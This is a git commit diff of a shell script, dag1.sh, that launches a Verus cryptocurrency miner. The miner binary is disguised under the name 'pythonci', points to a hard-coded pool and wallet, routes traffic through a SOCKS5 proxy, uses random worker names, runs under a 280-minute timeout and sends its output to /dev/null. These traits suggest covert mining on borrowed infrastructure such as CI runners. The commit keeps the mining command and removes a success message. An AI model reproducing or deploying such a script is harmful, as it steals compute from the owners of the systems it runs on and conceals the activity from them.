640821e9db4bb3b46731945ec7ca047ec795dcd7
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-11 10:55:57 +0100

    Update dag1.sh

--- dag1.sh
+++ dag1.sh
@@ -9,5 +9,4 @@ POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 PROXY=socks5://78.46.89.24:45265
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-axer)
-timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
-echo Sukses
+timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null
